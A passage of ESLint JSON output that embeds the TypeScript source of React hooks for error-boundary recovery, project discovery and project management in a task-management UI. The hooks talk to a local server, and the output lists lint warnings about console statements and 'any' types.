number;\n  isolationLevel?: 'component' | 'feature' | 'page';\n  enableErrorReporting?: boolean;\n  enableMUIIntegration?: boolean;\n  customRecoveryStrategies?: ErrorRecoveryStrategy[];\n  onError?: (error: Error, errorInfo: any) => void;\n  onRecover?: (strategy: string) => void;\n  onRetry?: (attempt: number) => void;\n}\n\n// Default options\nconst _defaultOptions: Required<UseErrorBoundaryOptions> = {\n  enableAutoRecovery: errorHandlingConfig.errorBoundary.enableAutoRecovery,\n  enableUserFeedback: errorHandlingConfig.userFeedback.enableUserReporting,\n  enableStatePreservation: errorHandlingConfig.errorBoundary.enableStatePreservation,\n  maxRetryAttempts: errorHandlingConfig.errorBoundary.maxRetryAttempts,\n  retryDelay: errorHandlingConfig.errorBoundary.retryDelayMs,\n  isolationLevel: errorHandlingConfig.errorBoundary.isolationLevel as 'component' | 'feature' | 'page',\n  enableErrorReporting: errorHandlingConfig.global.enableErrorBoundaries,\n  enableMUIIntegration: true,\n  customRecoveryStrategies: [],\n  onError: () => {},\n  onRecover: () => {},\n  onRetry: () => {},\n};\n\n/**\n * Error Boundary Hook\n */\nexport const _useErrorBoundary = (options: UseErrorBoundaryOptions = {}) => {\n  const config = { ..._defaultOptions, ...options };\n  \n  // Hooks\n  const reactErrorHandler = useErrorHandler();\n  const { preserveOnError, restoreState, availableSessions } = useAppState({\n    enableAutoPreservation: config.enableStatePreservation,\n  });\n\n  // State\n  const [errorState, setErrorState] = useState<ErrorBoundaryState>({\n    hasError: false,\n    error: null,\n    errorId: null,\n    errorType: 'unknown',\n    retryCount: 0,\n    lastRetryTime: null,\n    canRetry: true,\n    autoRecoveryInProgress: false,\n    userFeedbackSubmitted: false,\n  });\n\n  const [recoveryStrategies] = useState<ErrorRecoveryStrategy[]>([\n    ...getDefaultRecoveryStrategies(),\n    ...config.customRecoveryStrategies,\n  ]);\n\n  // Refs for stable references\n  const autoRecoveryTimeoutRef = useRef<NodeJS.Timeout | null>(null);\n  const errorHistoryRef = useRef<Error[]>([]);\n\n  /**\n   * Handle error with comprehensive error boundary logic\n   */\n  const handleError = useCallback(async (\n    error: Error,\n    context: Partial<ErrorContext> = {}\n  ) => {\n    const errorType = classifyError(error);\n    const errorId = `err_${Date.now()}_${Math.random().toString(36).substring(2)}`;\n    \n    // Add to error history\n    errorHistoryRef.current.push(error);\n    if (errorHistoryRef.current.length > 10) {\n      errorHistoryRef.current.shift(); // Keep only last 10 errors\n    }\n\n    // Update error state\n    setErrorState(prev => ({\n      ...prev,\n      hasError: true,\n      error,\n      errorId,\n      errorType,\n      canRetry: prev.retryCount < config.maxRetryAttempts,\n      autoRecoveryInProgress: false,\n      userFeedbackSubmitted: false,\n    }));\n\n    // Preserve state if enabled\n    if (config.enableStatePreservation) {\n      try {\n        await preserveOnError(error, errorId);\n      } catch (preservationError) {\n        console.error('Failed to preserve state on error:', preservationError);\n      }\n    }\n\n    // Report error if enabled\n    if (config.enableErrorReporting) {\n      try {\n        await errorReportingService.reportError(error, undefined, {\n          ...context,\n          component: 'useErrorBoundary',\n          action: 'error_caught',\n          severity: getSeverityFromError(error),\n          metadata: {\n            errorId,\n            errorType,\n            isolationLevel: config.isolationLevel,\n            retryCount: errorState.retryCount,\n          }\n        });\n      } catch (reportingError) {\n        console.error('Failed to report error:', reportingError);\n      }\n    }\n\n    // Call custom error handler\n    config.onError(error, { errorId, errorType });\n\n    // Attempt automatic recovery if enabled\n    if (config.enableAutoRecovery && errorState.canRetry) {\n      attemptAutoRecovery(error);\n    }\n\n    // Use React error boundary as fallback\n    reactErrorHandler(error);\n  }, [\n    config,\n    errorState.retryCount,\n    errorState.canRetry,\n    preserveOnError,\n    reactErrorHandler\n  ]);\n\n  /**\n   * Attempt automatic recovery using available strategies\n   */\n  const attemptAutoRecovery = useCallback(async (error: Error) => {\n    if (errorState.autoRecoveryInProgress) return;\n\n    setErrorState(prev => ({ ...prev, autoRecoveryInProgress: true }));\n\n    try {\n      // Find applicable automatic recovery strategies\n      const applicableStrategies = recoveryStrategies\n        .filter(strategy => \n          strategy.automatic && \n          strategy.canExecute(error, errorState)\n        )\n        .sort((a, b) => b.priority - a.priority);\n\n      for (const strategy of applicableStrategies) {\n        try {\n          console.debug(`Attempting recovery strategy: ${strategy.name}`);\n          const success = await strategy.execute();\n          \n          if (success) {\n            console.debug(`Recovery successful with strategy: ${strategy.name}`);\n            await handleRecovery(strategy.id);\n            return;\n          }\n        } catch (strategyError) {\n          console.warn(`Recovery strategy ${strategy.name} failed:`, strategyError);\n        }\n      }\n\n      // If no strategy succeeded, try exponential backoff retry\n      const delay = config.retryDelay * Math.pow(2, errorState.retryCount);\n      autoRecoveryTimeoutRef.current = setTimeout(() => {\n        handleRetry();\n      }, delay);\n\n    } finally {\n      setErrorState(prev => ({ ...prev, autoRecoveryInProgress: false }));\n    }\n  }, [errorState, recoveryStrategies, config.retryDelay]);\n\n  /**\n   * Handle successful recovery\n   */\n  const handleRecovery = useCallback(async (strategyId: string) => {\n    setErrorState({\n      hasError: false,\n      error: null,\n      errorId: null,\n      errorType: 'unknown',\n      retryCount: 0,\n      lastRetryTime: null,\n      canRetry: true,\n      autoRecoveryInProgress: false,\n      userFeedbackSubmitted: false,\n    });\n\n    // Report successful recovery\n    if (config.enableErrorReporting) {\n      try {\n        await errorReportingService.reportError(\n          new Error('Error recovery successful'),\n          undefined,\n          {\n            component: 'useErrorBoundary',\n            action: 'recovery_successful',\n            severity: 'low',\n            metadata: { strategyId, retryCount: errorState.retryCount }\n          }\n        );\n      } catch (error) {\n        console.error('Failed to report recovery:', error);\n      }\n    }\n\n    config.onRecover(strategyId);\n  }, [config, errorState.retryCount]);\n\n  /**\n   * Manual retry operation\n   */\n  const handleRetry = useCallback(async () => {\n    if (!errorState.canRetry) return;\n\n    const newRetryCount = errorState.retryCount + 1;\n    const canRetryAgain = newRetryCount < config.maxRetryAttempts;\n\n    setErrorState(prev => ({\n      ...prev,\n      retryCount: newRetryCount,\n      lastRetryTime: Date.now(),\n      canRetry: canRetryAgain,\n      hasError: false,\n      autoRecoveryInProgress: false,\n    }));\n\n    config.onRetry(newRetryCount);\n\n    // If we've exhausted retries, try state restoration\n    if (!canRetryAgain && availableSessions.length > 0) {\n      try {\n        await restoreState();\n        await handleRecovery('state_restoration');\n      } catch (error) {\n        console.error('State restoration failed:', error);\n      }\n    }\n  }, [\n    errorState.canRetry,\n    errorState.retryCount,\n    config.maxRetryAttempts,\n    config.onRetry,\n    availableSessions,\n    restoreState,\n    handleRecovery\n  ]);\n\n  /**\n   * Submit user feedback for error\n   */\n  const submitUserFeedback = useCallback(async (\n    feedbackData: Omit<UserFeedback, 'reportId' | 'timestamp'>\n  ): Promise<boolean> => {\n    if (!errorState.errorId || errorState.userFeedbackSubmitted) {\n      return false;\n    }\n\n    try {\n      const userFeedback: Omit<UserFeedback, 'timestamp'> = {\n        reportId: errorState.errorId,\n        ...feedbackData,\n      };\n\n      const success = await errorReportingService.submitUserFeedback(userFeedback);\n      \n      if (success) {\n        setErrorState(prev => ({ ...prev, userFeedbackSubmitted: true }));\n      }\n\n      return success;\n    } catch (error) {\n      console.error('Failed to submit user feedback:', error);\n      return false;\n    }\n  }, [errorState.errorId, errorState.userFeedbackSubmitted]);\n\n  /**\n   * Reset error boundary state\n   */\n  const resetErrorBoundary = useCallback(() => {\n    if (autoRecoveryTimeoutRef.current) {\n      clearTimeout(autoRecoveryTimeoutRef.current);\n      autoRecoveryTimeoutRef.current = null;\n    }\n\n    setErrorState({\n      hasError: false,\n      error: null,\n      errorId: null,\n      errorType: 'unknown',\n      retryCount: 0,\n      lastRetryTime: null,\n      canRetry: true,\n      autoRecoveryInProgress: false,\n      userFeedbackSubmitted: false,\n    });\n  }, []);\n\n  /**\n   * Get error statistics\n   */\n  const getErrorStats = useCallback(() => {\n    return {\n      totalErrors: errorHistoryRef.current.length,\n      currentRetryCount: errorState.retryCount,\n      canRetry: errorState.canRetry,\n      hasActiveError: errorState.hasError,\n      autoRecoveryEnabled: config.enableAutoRecovery,\n      lastError: errorState.error,\n      errorType: errorState.errorType,\n      userFeedbackSubmitted: errorState.userFeedbackSubmitted,\n    };\n  }, [errorState, config.enableAutoRecovery]);\n\n  /**\n   * Get user-friendly error message\n   */\n  const getDisplayErrorMessage = useCallback(() => {\n    if (!errorState.error) return '';\n    return getErrorMessage(errorState.error);\n  }, [errorState.error]);\n\n  // Cleanup on unmount\n  useEffect(() => {\n    return () => {\n      if (autoRecoveryTimeoutRef.current) {\n        clearTimeout(autoRecoveryTimeoutRef.current);\n      }\n    };\n  }, []);\n\n  return {\n    // State\n    errorState,\n    hasError: errorState.hasError,\n    error: errorState.error,\n    errorId: errorState.errorId,\n    errorType: errorState.errorType,\n    canRetry: errorState.canRetry,\n    isRecovering: errorState.autoRecoveryInProgress,\n\n    // Actions\n    handleError,\n    handleRetry,\n    resetErrorBoundary,\n    submitUserFeedback,\n\n    // Utilities\n    getErrorStats,\n    getDisplayErrorMessage,\n    recoveryStrategies,\n  };\n};\n\n/**\n * Get default recovery strategies\n */\nfunction getDefaultRecoveryStrategies(): ErrorRecoveryStrategy[] {\n  return [\n    {\n      id: 'page_reload',\n      name: 'Page Reload',\n      description: 'Reload the entire page to recover from critical errors',\n      automatic: false,\n      priority: 1,\n      canExecute: (error, state) => state.retryCount >= 2,\n      execute: async () => {\n        window.location.reload();\n        return true;\n      },\n    },\n    {\n      id: 'state_restoration',\n      name: 'State Restoration',\n      description: 'Restore application state from previous backup',\n      automatic: true,\n      priority: 5,\n      canExecute: (error, state) => state.retryCount >= 1,\n      execute: async () => {\n        // This would be implemented with proper state restoration logic\n        return false;\n      },\n    },\n    {\n      id: 'component_remount',\n      name: 'Component Remount',\n      description: 'Force remount the component tree',\n      automatic: true,\n      priority: 3,\n      canExecute: (error, state) => true,\n      execute: async () => {\n        // This would trigger a component remount\n        return false;\n      },\n    },\n    {\n      id: 'clear_storage',\n      name: 'Clear Storage',\n      description: 'Clear browser storage to resolve data conflicts',\n      automatic: false,\n      priority: 2,\n      canExecute: (error, state) => \n        error.message.includes('storage') || \n        error.message.includes('quota'),\n      execute: async () => {\n        try {\n          localStorage.clear();\n          sessionStorage.clear();\n          return true;\n        } catch {\n          return false;\n        }\n      },\n    },\n  ];\n}\n\n/**\n * Get error severity from error object\n */\nfunction getSeverityFromError(error: Error): 'low' | 'medium' | 'high' | 'critical' {\n  const message = error.message.toLowerCase();\n  const name = error.name.toLowerCase();\n\n  if (name.includes('typeerror') || name.includes('referenceerror')) {\n    return 'critical';\n  }\n\n  if (message.includes('network') || message.includes('timeout')) {\n    return 'medium';\n  }\n\n  if (message.includes('validation') || message.includes('parse')) {\n    return 'low';\n  }\n\n  return 'medium';\n}\n\n// Export hook and types\nexport default _useErrorBoundary;\nexport type {\n  ErrorBoundaryState,\n  ErrorRecoveryStrategy,\n  UseErrorBoundaryOptions\n};\n","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/hooks/useProjectDiscovery.ts","messages":[{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":61,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":61,"endColumn":24,"suggestions":[{"fix":{"range":[1625,1704],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":67,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":67,"endColumn":26,"suggestions":[{"fix":{"range":[1853,1901],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":71,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":71,"endColumn":22,"suggestions":[{"fix":{"range":[1960,2027],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":102,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":102,"endColumn":18,"suggestions":[{"fix":{"range":[2822,2874],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":124,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":124,"endColumn":20,"suggestions":[{"fix":{"range":[3540,3593],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":138,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":138,"endColumn":20,"suggestions":[{"fix":{"range":[3953,4010],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":159,"column":54,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":159,"endColumn":57,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4656,4659],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4656,4659],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":160,"column":50,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":160,"endColumn":53,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4724,4727],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4724,4727],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":164,"column":32,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":164,"endColumn":35,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4891,4894],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4891,4894],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":167,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":167,"endColumn":20,"suggestions":[{"fix":{"range":[4983,5035],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":169,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":169,"endColumn":23,"suggestions":[{"fix":{"range":[5079,5137],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":11,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import { useState, useEffect, useCallback } from 'react'\n\ninterface DiscoveredProject {\n  id: string\n  name: string\n  path: string\n  tasksFile: string\n  lastModified: string\n  discoveryMethod: 'file-scan' | 'git-scan' | 'full-scan'\n}\n\ninterface DiscoveryProgress {\n  phase: string\n  current: number\n  total: number\n  found: number\n}\n\ninterface DiscoveryOptions {\n  includeGitScan?: boolean\n  includeFullScan?: boolean\n  fullScanOptions?: {\n    maxDepth?: number\n    skipHidden?: boolean\n    skipSystem?: boolean\n    startPaths?: string[]\n  }\n}\n\nconst SERVER_URL = 'http://localhost:3001'\n\nexport function useProjectDiscovery() {\n  const [discoveredProjects, setDiscoveredProjects] = useState<DiscoveredProject[]>([])\n  const [isDiscovering, setIsDiscovering] = useState(false)\n  const [progress, setProgress] = useState<DiscoveryProgress>({\n    phase: '',\n    current: 0,\n    total: 0,\n    found: 0\n  })\n  const [selectedProjects, setSelectedProjects] = useState<Set<string>>(new Set())\n  const [error, setError] = useState<string | null>(null)\n\n  // WebSocket connection for discovery updates\n  useEffect(() => {\n    const ws = new WebSocket(`ws://localhost:3001`)\n    \n    ws.onmessage = (event) => {\n      try {\n        const message = JSON.parse(event.data)\n        \n        switch (message.type) {\n          case 'discoveryProgress':\n            setProgress(message.progress)\n            break\n            \n          case 'discoveryComplete':\n            setDiscoveredProjects(message.projects)\n            setIsDiscovering(false)\n            setProgress(prev => ({ ...prev, phase: 'Discovery Complete!' }))\n            console.log(`ðŸŽ‰ Discovery complete! Found ${message.projects.length} projects`)\n            break\n            \n          case 'discoveryError':\n            setError(message.error)\n            setIsDiscovering(false)\n            console.error('Discovery error:', message.error)\n            break\n        }\n      } catch (err) {\n        console.error('Error processing discovery WebSocket message:', err)\n      }\n    }\n    \n    return () => {\n      ws.close()\n    }\n  }, [])\n\n  // Start auto-discovery\n  const startDiscovery = useCallback(async (options: DiscoveryOptions = {}) => {\n    try {\n      setError(null)\n      setIsDiscovering(true)\n      setDiscoveredProjects([])\n      setProgress({ phase: 'Starting discovery...', current: 0, total: 0, found: 0 })\n      \n      const response = await fetch(`${SERVER_URL}/api/discovery/start`, {\n        method: 'POST',\n        headers: {\n          'Content-Type': 'application/json',\n        },\n        body: JSON.stringify(options),\n      })\n      \n      if (!response.ok) {\n        const error = await response.json()\n        throw new Error(error.error || 'Failed to start discovery')\n      }\n      \n      const result = await response.json()\n      console.log('ðŸš€ Discovery started:', result.message)\n      \n      return { success: true }\n    } catch (err) {\n      const errorMessage = err instanceof Error ? err.message : String(err)\n      setError(`Failed to start discovery: ${errorMessage}`)\n      setIsDiscovering(false)\n      return { success: false, error: errorMessage }\n    }\n  }, [])\n\n  // Get discovery status\n  const getDiscoveryStatus = useCallback(async () => {\n    try {\n      const response = await fetch(`${SERVER_URL}/api/discovery/status`)\n      if (response.ok) {\n        const status = await response.json()\n        setIsDiscovering(status.isScanning)\n        setProgress(status.progress)\n        return status\n      }\n    } catch (err) {\n      console.error('Failed to get discovery status:', err)\n    }\n  }, [])\n\n  // Get discovered projects\n  const loadDiscoveredProjects = useCallback(async () => {\n    try {\n      const response = await fetch(`${SERVER_URL}/api/discovery/projects`)\n      if (response.ok) {\n        const projects = await response.json()\n        setDiscoveredProjects(projects)\n        return projects\n      }\n    } catch (err) {\n      console.error('Failed to load discovered projects:', err)\n    }\n  }, [])\n\n  // Add selected projects to the main project list\n  const addSelectedProjects = useCallback(async () => {\n    try {\n      if (selectedProjects.size === 0) {\n        return { success: false, error: 'No projects selected' }\n      }\n\n      const response = await fetch(`${SERVER_URL}/api/discovery/add-selected`, {\n        method: 'POST',\n        headers: {\n          'Content-Type': 'application/json',\n        },\n        body: JSON.stringify({ projectIds: Array.from(selectedProjects) }),\n      })\n      \n      if (response.ok) {\n        const result = await response.json()\n        const successful = result.results.filter((r: any) => r.success)\n        const failed = result.results.filter((r: any) => !r.success)\n        \n        // Clear selections for successful additions\n        const newSelected = new Set(selectedProjects)\n        successful.forEach((r: any) => newSelected.delete(r.id))\n        setSelectedProjects(newSelected)\n        \n        console.log(`âœ… Added ${successful.length} projects`)\n        if (failed.length > 0) {\n          console.warn(`âš ï¸ Failed to add ${failed.length} projects`)\n        }\n        \n        return { \n          success: true, \n          added: successful.length,\n          failed: failed.length,\n          errors: failed\n        }\n      } else {\n        const error = await response.json()\n        return { success: false, error: error.error }\n      }\n    } catch (err) {\n      const errorMessage = err instanceof Error ? err.message : String(err)\n      return { success: false, error: errorMessage }\n    }\n  }, [selectedProjects])\n\n  // Project selection management\n  const toggleProjectSelection = useCallback((projectId: string) => {\n    setSelectedProjects(prev => {\n      const newSet = new Set(prev)\n      if (newSet.has(projectId)) {\n        newSet.delete(projectId)\n      } else {\n        newSet.add(projectId)\n      }\n      return newSet\n    })\n  }, [])\n\n  const selectAllProjects = useCallback(() => {\n    setSelectedProjects(new Set(discoveredProjects.map(p => p.id)))\n  }, [discoveredProjects])\n\n  const deselectAllProjects = useCallback(() => {\n    setSelectedProjects(new Set())\n  }, [])\n\n  // Quick discovery presets\n  const quickDiscovery = useCallback(() => {\n    return startDiscovery({\n      includeGitScan: true,\n      includeFullScan: false\n    })\n  }, [startDiscovery])\n\n  const deepDiscovery = useCallback(() => {\n    return startDiscovery({\n      includeGitScan: true,\n      includeFullScan: true,\n      fullScanOptions: {\n        maxDepth: 6,\n        skipHidden: true,\n        skipSystem: true\n      }\n    })\n  }, [startDiscovery])\n\n  const customDiscovery = useCallback((options: DiscoveryOptions) => {\n    return startDiscovery(options)\n  }, [startDiscovery])\n\n  // Load status on mount\n  useEffect(() => {\n    getDiscoveryStatus()\n    loadDiscoveredProjects()\n  }, [getDiscoveryStatus, loadDiscoveredProjects])\n\n  return {\n    // State\n    discoveredProjects,\n    isDiscovering,\n    progress,\n    selectedProjects,\n    error,\n    \n    // Actions\n    startDiscovery,\n    quickDiscovery,\n    deepDiscovery,\n    customDiscovery,\n    addSelectedProjects,\n    \n    // Selection management\n    toggleProjectSelection,\n    selectAllProjects,\n    deselectAllProjects,\n    \n    // Data loading\n    getDiscoveryStatus,\n    loadDiscoveredProjects,\n    \n    // Computed\n    selectedCount: selectedProjects.size,\n    totalDiscovered: discoveredProjects.length,\n    canAddProjects: selectedProjects.size > 0 && !isDiscovering\n  }\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/hooks/useProjectManager.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":16,"column":18,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":16,"endColumn":21,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[302,305],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[302,305],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":34,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":34,"endColumn":18,"suggestions":[{"fix":{"range":[850,904],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":43,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":43,"endColumn":22,"suggestions":[{"fix":{"range":[1098,1153],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":58,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":58,"endColumn":22,"suggestions":[{"fix":{"range":[1636,1693],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":63,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":63,"endColumn":18,"suggestions":[{"fix":{"range":[1744,1803],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":82,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":82,"endColumn":20,"suggestions":[{"fix":{"range":[2237,2283],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/ban-ts-comment","severity":1,"message":"Use \"@ts-expect-error\" instead of \"@ts-ignore\", as \"@ts-ignore\" will do nothing if the following line is error-free.","line":171,"column":7,"nodeType":"Line","messageId":"tsIgnoreInsteadOfExpectError","endLine":171,"endColumn":45,"suggestions":[{"messageId":"replaceTsIgnoreWithTsExpectError","fix":{"range":[5057,5095],"text":"// @ts-expect-error - File System Access API"},"desc":"Replace \"@ts-ignore\" with \"@ts-expect-error\"."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":182,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":182,"endColumn":20,"suggestions":[{"fix":{"range":[5642,5703],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":186,"column":19,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":186,"endColumn":22,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[5757,5760],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[5757,5760],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":9,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import { useState, useEffect, useCallback } from 'react'\nimport { useTaskStore } from '@/store/useTaskStore'\n\ninterface Project {\n  id: string\n  name: string\n  path: string\n  taskCount: number\n  lastUpdated: string\n}\n\ninterface ProjectData {\n  id: string\n  name: string\n  path: string\n  data: { tasks: any[] }\n  lastUpdated: string\n}\n\nconst SERVER_URL = 'http://localhost:3001'\n\nexport function useProjectManager() {\n  const [projects, setProjects] = useState<Project[]>([])\n  const [activeProject, setActiveProject] = useState<string | null>(null)\n  const [isConnected, setIsConnected] = useState(false)\n  const [isLoading, setIsLoading] = useState(false)\n  const { loadFromJSON } = useTaskStore()\n\n  // WebSocket connection for live updates\n  useEffect(() => {\n    const ws = new WebSocket(`ws://localhost:3001`)\n    \n    ws.onopen = () => {\n      console.log('ðŸ”— Connected to TaskMaster file watcher')\n      setIsConnected(true)\n    }\n    \n    ws.onmessage = (event) => {\n      try {\n        const message = JSON.parse(event.data)\n        \n        if (message.type === 'fileUpdate') {\n          console.log(`ðŸ“Š Live update from ${message.projectId}`)\n          \n          // Update projects list\n          setProjects(prev => prev.map(p => \n            p.id === message.projectId \n              ? { ...p, taskCount: message.data.tasks?.length || 0, lastUpdated: new Date().toISOString() }\n              : p\n          ))\n          \n          // If this is the active project, update the UI\n          if (message.projectId === activeProject) {\n            loadFromJSON(message.data)\n          }\n        }\n      } catch (err) {\n        console.error('Error processing WebSocket message:', err)\n      }\n    }\n    \n    ws.onclose = () => {\n      console.log('ðŸ”Œ Disconnected from TaskMaster file watcher')\n      setIsConnected(false)\n    }\n    \n    return () => {\n      ws.close()\n    }\n  }, [activeProject, loadFromJSON])\n\n  // Load projects list\n  const loadProjects = useCallback(async () => {\n    try {\n      setIsLoading(true)\n      const response = await fetch(`${SERVER_URL}/api/projects`)\n      if (response.ok) {\n        const projectList = await response.json()\n        setProjects(projectList)\n      }\n    } catch (err) {\n      console.error('Failed to load projects:', err)\n    } finally {\n      setIsLoading(false)\n    }\n  }, [])\n\n  // Add a new project\n  const addProject = useCallback(async (name: string, path: string) => {\n    try {\n      setIsLoading(true)\n      const id = `${name.toLowerCase().replace(/\\s+/g, '-')}-${Date.now()}`\n      \n      const response = await fetch(`${SERVER_URL}/api/projects`, {\n        method: 'POST',\n        headers: {\n          'Content-Type': 'application/json',\n        },\n        body: JSON.stringify({ id, name, path }),\n      })\n      \n      if (response.ok) {\n        await loadProjects()\n        return { success: true, id }\n      } else {\n        const error = await response.json()\n        return { success: false, error: error.error }\n      }\n    } catch (err) {\n      const errorMessage = err instanceof Error ? err.message : String(err)\n      return { success: false, error: `Failed to add project: ${errorMessage}` }\n    } finally {\n      setIsLoading(false)\n    }\n  }, [loadProjects])\n\n  // Remove project\n  const removeProject = useCallback(async (projectId: string) => {\n    try {\n      setIsLoading(true)\n      const response = await fetch(`${SERVER_URL}/api/projects/${projectId}`, {\n        method: 'DELETE',\n      })\n      \n      if (response.ok) {\n        if (activeProject === projectId) {\n          setActiveProject(null)\n        }\n        await loadProjects()\n        return { success: true }\n      } else {\n        return { success: false, error: 'Failed to remove project' }\n      }\n    } catch (err) {\n      const errorMessage = err instanceof Error ? err.message : String(err)\n      return { success: false, error: `Failed to remove project: ${errorMessage}` }\n    } finally {\n      setIsLoading(false)\n    }\n  }, [activeProject, loadProjects])\n\n  // Switch to a project\n  const switchToProject = useCallback(async (projectId: string) => {\n    try {\n      setIsLoading(true)\n      const response = await fetch(`${SERVER_URL}/api/projects/${projectId}`)\n      \n      if (response.ok) {\n        const projectData: ProjectData = await response.json()\n        loadFromJSON(projectData.data)\n        setActiveProject(projectId)\n        return { success: true }\n      } else {\n        return { success: false, error: 'Failed to load project data' }\n      }\n    } catch (err) {\n      const errorMessage = err instanceof Error ? err.message : String(err)\n      return { success: false, error: `Failed to switch to project: ${errorMessage}` }\n    } finally {\n      setIsLoading(false)\n    }\n  }, [loadFromJSON])\n\n  // Add project using File System Access API (for modern browsers)\n  const addProjectWithFilePicker = useCallback(async () => {\n    if (!('showDirectoryPicker' in window)) {\n      return { success: false, error: 'File System Access API not supported' }\n    }\n\n    try {\n      // @ts-ignore - File System Access API\n      const dirHandle = await window.showDirectoryPicker()\n      const projectName = dirHandle.name\n      \n      // For now, we'll use a placeholder path since we can't get the actual file path\n      // In a real implementation, you'd need to store the directory handle\n      const result = await addProject(projectName, `[Browser Selected] ${projectName}`)\n      \n      if (result.success) {\n        // Store the directory handle for future use\n        // Note: This would require additional implementation to work with the file watcher\n        console.log('ðŸ“ Project added via file picker:', projectName)\n      }\n      \n      return result\n    } catch (err: any) {\n      if (err.name === 'AbortError') {\n        return { success: false, error: 'User cancelled file selection' }\n      }\n      const errorMessage = err instanceof Error ? err.message : String(err)\n      return { success: false, error: `Failed to select directory: ${errorMessage}` }\n    }\n  }, [addProject])\n\n  // Load projects on mount\n  useEffect(() => {\n    